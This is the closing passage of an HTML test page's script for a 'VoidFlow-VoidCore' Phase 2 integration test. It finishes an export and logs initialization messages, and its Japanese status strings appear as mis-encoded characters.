            URL.revokeObjectURL(url);
            
            addTestResult('success', 'ğŸ“„ Phase 2ãƒ†ã‚¹ãƒˆçµæœã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆå®Œäº†');
        }

        // åˆæœŸåŒ–
        updateAllStats();
        logToArea('pluginLog', 'ğŸ”Œ VoidFlow-VoidCoreçµ±åˆãƒ†ã‚¹ãƒˆ Phase 2 åˆæœŸåŒ–å®Œäº†');
        logToArea('integrationLog', 'ğŸš€ çµ±åˆå®Ÿè¡Œã‚·ã‚¹ãƒ†ãƒ æº–å‚™å®Œäº†');
        logToArea('performanceLog', 'âš¡ ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãƒ†ã‚¹ãƒˆæº–å‚™å®Œäº†');
        logToArea('securityLog', 'ğŸ›¡ï¸ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆæº–å‚™å®Œäº†');
        
        addTestResult('info', 'ğŸš€ Phase 2çµ±åˆãƒ†ã‚¹ãƒˆç’°å¢ƒæº–å‚™å®Œäº†');
    </script>
</body>
</html>